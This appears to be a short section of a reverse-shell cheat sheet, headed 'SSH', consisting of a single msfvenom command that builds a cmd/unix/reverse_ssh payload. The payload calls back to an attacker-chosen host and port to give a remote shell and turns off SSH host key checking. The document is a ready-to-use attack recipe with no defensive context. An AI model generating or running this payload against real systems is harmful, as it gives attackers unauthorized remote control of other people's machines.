# SSH

## 01 - Generate via `msfvenom`

```
$ msfvenom -p cmd/unix/reverse_ssh shellpath=/bin/sh [sshpath=/path/to/ssh] sshclientoptions="UserKnownHostsFile=/dev/null StrictHostKeyChecking=no" lhost=<IP> lport=<PORT>
```